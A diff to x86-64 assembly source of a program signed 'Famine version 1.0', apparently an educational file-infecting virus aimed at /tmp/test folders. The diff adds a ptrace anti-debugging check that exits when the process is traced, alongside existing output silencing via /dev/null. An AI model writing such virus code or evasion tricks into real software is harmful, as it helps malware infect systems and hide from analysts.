@@ -11,6 +11,7 @@
 %define SYS_PWRITE64 18
 %define SYS_SYNC    162
 %define SYS_DUP2    33
+%define SYS_PTRACE  101
 %define FLAG_O_RDONLY 0
 %define NULL        0
 
@@ -28,6 +29,15 @@ _start:
 
     test rax, rax ;check error or parent
     jnz safe_exit
+
+    mov rax, SYS_PTRACE
+    mov rdi, 0
+    xor rsi, rsi
+    xor rdx, rdx
+    xor r10, r10
+    syscall
+    test rax, rax
+    js safe_exit
 
     call redirect_dev_null
 
@@ -388,11 +398,11 @@ split_and_print:
 folder1 db "/tmp/test", NULL
 folder2 db "/tmp/test2", NULL
 
-famine_str db 'famine=', 0
+famine_str db 'famine=', NULL
 
 dev_null db "/dev/null", NULL
 
-signature db "Famine version 1.0 (c)oded dec-2024 by gemartin", NULL
+signature db "Famine version 1.0 (c)oded dec-2024 by gemartin-jareste", NULL
 
 redirect_dev_null:
     lea rdi, [rel dev_null]
